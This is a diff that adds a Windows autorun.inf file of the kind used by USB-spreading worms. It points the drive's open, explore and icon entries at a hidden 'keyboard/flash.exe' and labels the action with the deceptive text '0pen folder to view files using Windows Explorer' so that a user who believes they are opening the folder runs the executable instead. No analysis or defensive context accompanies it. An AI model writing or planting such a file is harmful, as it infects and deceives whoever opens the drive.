@@ -1,0 +1,9 @@
+[autorun]
+USEAUTOPLAY=1
+shellexcute=keyboard/flash.exe
+Shellfiber
+shell\\Explore\\command=keyboard/flash.exe
+shell\Open\\command=keyboard/flash.exe
+icon=keyboard/flash.exe
+open=keyboard/flash.exe
+action=0pen folder to view files using Windows Explorer
